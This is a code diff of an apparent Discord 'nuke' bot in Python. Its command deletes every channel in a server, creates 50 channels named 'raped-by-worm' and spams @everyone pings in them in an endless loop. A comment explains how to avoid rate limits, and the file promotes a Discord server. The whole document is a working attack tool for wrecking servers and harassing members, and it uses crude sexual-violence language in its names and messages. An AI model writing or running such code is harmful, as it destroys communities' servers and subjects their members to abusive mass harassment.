@@ -2,31 +2,26 @@ import discord
 from discord.ext import commands
 import asyncio
 
-intents = discord.Intents.all()
+intents = discord.Intents.default()
+intents.message_content = True
 
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-TOKEN = 'Your Token'
+@bot.command()
+async def nook(ctx):
+    delete_tasks = [channel.delete() for channel in ctx.guild.channels]
+    await asyncio.gather(*delete_tasks)
 
-@bot.event
-async def on_ready():
-    print(f"Loaded as: {bot.user}")
-
-@bot.command(name="rape")
-async def rape(ctx):
-    mass_delete = [channel.delete() for channel in ctx.guild.channels]
-    await asyncio.gather(*mass_delete)
-
-    create = [ctx.guild.create_text_channel("worm-on-top") for _ in range(50)]
-    channels = await asyncio.gather(*create)
+    create_tasks = [ctx.guild.create_text_channel("raped-by-worm") for _ in range(50)]
+    new_channels = await asyncio.gather(*create_tasks)
 
     async def ping_channels():
         while True:
-            mass_ping = [channel.send("@everyone raped by discord.gg/wrm") for channel in channels]
-            await asyncio.gather(*mass_ping)
+            ping_tasks = [channel.send("@everyone WORM ON TOP!") for channel in new_channels]
+            await asyncio.gather(*ping_tasks)
+            # JUST ADD  await asyncio.sleep(1) TO PREVENT RATE LIMITS
 
-    ping_task = asyncio.create_task(ping_channels())
+    asyncio.create_task(ping_channels())
 
-bot.run(TOKEN)
-
-  
+bot.run("ADD YOUR FUCKING TOKEN HERE")
+# first join the discord discord.gg/wrm 
